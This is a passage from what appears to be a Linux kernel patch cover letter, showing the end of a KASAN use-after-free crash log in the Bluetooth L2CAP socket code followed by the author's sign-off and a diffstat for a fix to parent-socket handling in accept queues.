[   22.981447]  ? __pfx___cancel_work (kernel/workqueue.c:2175)
[   22.981449]  ? l2cap_recv_frame (include/linux/skbuff.h:1323 include/linux/skbuff.h:1332 net/bluetooth/l2cap_core.c:5836 net/bluetooth/l2cap_core.c:7136)
[   22.981452]  ? kfree_skbmem (net/core/skbuff.c:1145)
[   22.981457]  l2cap_recv_frame (net/bluetooth/l2cap_core.c:4762 net/bluetooth/l2cap_core.c:4966 net/bluetooth/l2cap_core.c:5821 net/bluetooth/l2cap_core.c:7136)
[   22.981460]  ? __pfx_l2cap_recv_frame (net/bluetooth/l2cap_core.c:1709)
[   22.981463]  ? dequeue_entities (kernel/sched/fair.c:6303 kernel/sched/fair.c:7951)
[   22.981468]  ? pick_task_fair (kernel/sched/fair.c:6380 kernel/sched/fair.c:9933)
[   22.981471]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   22.981473]  ? mutex_lock (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:4457 kernel/locking/mutex.c:161 kernel/locking/mutex.c:318)
[   22.981477]  ? __pfx_mutex_lock (kernel/locking/mutex.c:1166)
[   22.981480]  ? __dequeue_entity (include/linux/rbtree_augmented.h:339 kernel/sched/fair.c:1051)
[   22.981483]  l2cap_recv_acldata (net/bluetooth/l2cap_core.c:7894)
[   22.981486]  ? _raw_spin_lock_irqsave (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:1301 include/asm-generic/qspinlock.h:111 include/linux/spinlock.h:187 include/linux/spinlock_api_smp.h:133 kernel/locking/spinlock.c:166)
[   22.981489]  ? __pfx_l2cap_recv_acldata (net/bluetooth/l2cap_core.c:7626)
[   22.981492]  ? __kasan_check_read (mm/kasan/shadow.c:31 (discriminator 1))
[   22.981494]  hci_rx_work (net/bluetooth/hci_core.c:3819 net/bluetooth/hci_core.c:4046)
[   22.981497]  process_one_work (kernel/workqueue.c:3322)
[   22.981500]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   22.981504]  worker_thread (kernel/workqueue.c:3405 kernel/workqueue.c:3486)
[   22.981506]  ? __pfx__raw_spin_lock_irqsave (include/asm-generic/qrwlock.h:122 (discriminator 4))
[   22.981510]  ? __pfx_worker_thread (include/linux/list.h:249)
[   22.981513]  kthread (kernel/kthread.c:436)
[   22.981516]  ? __pfx_kthread (include/linux/list.h:162)
[   22.981518]  ret_from_fork (arch/x86/kernel/process.c:158)
[   22.981521]  ? __pfx_ret_from_fork (arch/x86/include/asm/desc.h:328 (discriminator 7))
[   22.981524]  ? __kasan_check_read (mm/kasan/shadow.c:31 (discriminator 1))
[   22.981527]  ? __switch_to (arch/x86/kernel/process_64.c:403 arch/x86/kernel/process_64.c:663)
[   22.981531]  ? __pfx_kthread (include/linux/list.h:162)
[   22.981533]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   22.981538]  </TASK>
[   22.981539] 
[   23.882029] Allocated by task 279:
[   23.894792]  kasan_save_stack (mm/kasan/common.c:57)
[   23.910642]  kasan_save_track (mm/kasan/common.c:78)
[   23.926927]  kasan_save_alloc_info (mm/kasan/generic.c:570)
[   23.945973]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
[   23.962448]  __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
[   23.976234]  sk_prot_alloc (include/linux/slab.h:992 net/core/sock.c:2251)
[   23.995802]  sk_alloc (net/core/sock.c:2307)
[   24.011398]  bt_sock_alloc (net/bluetooth/af_bluetooth.c:148)
[   24.029888]  l2cap_sock_create (net/bluetooth/l2cap_sock.c:2017 net/bluetooth/l2cap_sock.c:2055)
[   24.051401]  bt_sock_create (net/bluetooth/af_bluetooth.c:132)
[   24.070858]  __sock_create (net/socket.c:1651)
[   24.086584]  __sys_socket (net/socket.c:1709 (discriminator 1) net/socket.c:1746 (discriminator 1) net/socket.c:1793 (discriminator 1))
[   24.104322]  __x64_sys_socket (net/socket.c:1807 net/socket.c:1805 net/socket.c:1805)
[   24.116814]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:42)
[   24.134319]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   24.145545]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   24.163880] 
[   24.168635] Freed by task 290:
[   24.177861]  kasan_save_stack (mm/kasan/common.c:57)
[   24.193353]  kasan_save_track (mm/kasan/common.c:78)
[   24.210792]  kasan_save_free_info (mm/kasan/generic.c:584)
[   24.227828]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
[   24.243284]  kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
[   24.254888]  __sk_destruct (net/core/sock.c:2290 net/core/sock.c:2390)
[   24.271534]  sk_destruct (net/core/sock.c:2418)
[   24.288493]  __sk_free (net/core/sock.c:2429)
[   24.306825]  sk_free (net/core/sock.c:2440)
[   24.318081]  l2cap_sock_kill (include/net/sock.h:2020 net/bluetooth/l2cap_sock.c:1356 net/bluetooth/l2cap_sock.c:1340)
[   24.339654]  l2cap_sock_release (net/bluetooth/l2cap_sock.c:1530)
[   24.357264]  __sock_release (net/socket.c:710)
[   24.370500]  sock_close (net/socket.c:1501 (discriminator 1))
[   24.384461]  __fput (fs/file_table.c:512)
[   24.395266]  fput_close_sync (fs/file_table.c:617)
[   24.412230]  __x64_sys_close (fs/open.c:1511 fs/open.c:1496 fs/open.c:1496)
[   24.429830]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:4)
[   24.446042]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   24.460851]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   24.484108] 
[   24.491170] The buggy address belongs to the object at ffff888005389c00
[   24.491170]  which belongs to the cache kmalloc-1k of size 1024
[   24.545080] The buggy address is located 264 bytes inside of
[   24.545080]  freed 1024-byte region [ffff888005389c00, ffff88800538a000)
[   24.589581] 
[   24.595388] The buggy address belongs to the physical page:
[   24.620825] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x5388
[   24.654732] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[   24.684912] flags: 0x100000000000040(head|node=0|zone=1)
[   24.708231] page_type: f5(slab)
[   24.724429] raw: 0100000000000040 ffff8880010430c0 ffffea0000159410 ffffea0000075810
[   24.753179] raw: 0000000000000000 00000000000a000a 00000000f5000000 0000000000000000
[   24.783533] head: 0100000000000040 ffff8880010430c0 ffffea0000159410 ffffea0000075810
[   24.814376] head: 0000000000000000 00000000000a000a 00000000f5000000 0000000000000000
[   24.854253] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 00000000ffffffff
[   24.883355] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   24.915015] page dumped because: kasan: bad access detected
[   24.938709] 
[   24.944462] Memory state around the buggy address:
[   24.968582]  ffff888005389c00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.008153]  ffff888005389c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.046501] >ffff888005389d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.084612]                       ^
[   25.104495]  ffff888005389d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.141167]  ffff888005389e00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.176545] ==================================================================

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  Bluetooth: Fix parent socket UAF in accept queues

 net/bluetooth/af_bluetooth.c | 2 ++
 net/bluetooth/iso.c          | 2 ++
 net/bluetooth/l2cap_sock.c   | 2 ++
 net/bluetooth/rfcomm/sock.c  | 2 ++
 4 files changed, 8 insertions(+)

-- 
2.43.0

